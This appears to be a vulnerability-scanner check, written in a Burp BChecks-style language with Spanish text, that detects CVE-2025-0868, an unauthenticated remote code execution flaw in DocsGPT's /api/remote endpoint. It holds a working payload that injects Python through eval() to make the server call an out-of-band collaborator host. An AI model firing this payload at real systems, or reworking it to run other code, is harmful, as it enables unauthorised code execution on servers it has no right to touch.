metadata:
    language: v2-beta
    name: "[CVE-2025-0868] DocsGPT - Ejecución remota de código no autenticado"
    description: "Comprueba si existe una vulnerabilidad de ejecución remota de código en DocsGPT mediante un análisis incorrecto de datos JSON utilizando eval() al /api/remote endpoint (CVE-2025-0868)"
    author: "P4IM0N, iamnoooob, rootxharsh, pdresearch"
    tags: "cve", "cve2025", "docsgpt", "unauth", "rce"

define:
    payload = `user=1&source=reddit&name=other&data=\{\"source\":\"reddit\",\"client_id\":\"1111\",\"client_secret\":1111,\"user_agent\":\"111\",\"search_queries\":[\"\"],\"number_posts\":10,\"rce\\\\\\\":\\__import__('requests').get('http://{generate_collaborator_address()}/')}#\":11}`
    issueDetail = "Una vulnerabilidad que podría resultar en Remote Code Execution (RCE) Se ha encontrado en DocsGPT. Debido al análisis incorrecto de datos JSON utilizando eval(), Un atacante no autorizado podría enviar código Python arbitrario para que se ejecute a través de /api/remote endpoint. Este problema afecta DocsGPT from 0.8.1 a través de 0.12.0."
    issueRemediation = "Update DocsGPT a la última versión que soluciona esta vulnerabilidad. Asegúrese de que la entrada del usuario esté correctamente desinfectada antes de procesarla, especialmente al utilizar funciones como eval() que puede ejecutar código arbitrario."

given host then
    send request called check:
        method: "POST"
        path: "/api/remote"
        headers:
            "Content-Type": "application/x-www-form-urlencoded"
        body: {payload}

    if http interactions and
        "\"task_id\":" in {check.response.body} and
        "\"status\":" in {check.response.body} then
        report issue:
            severity: high
            confidence: firm
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if
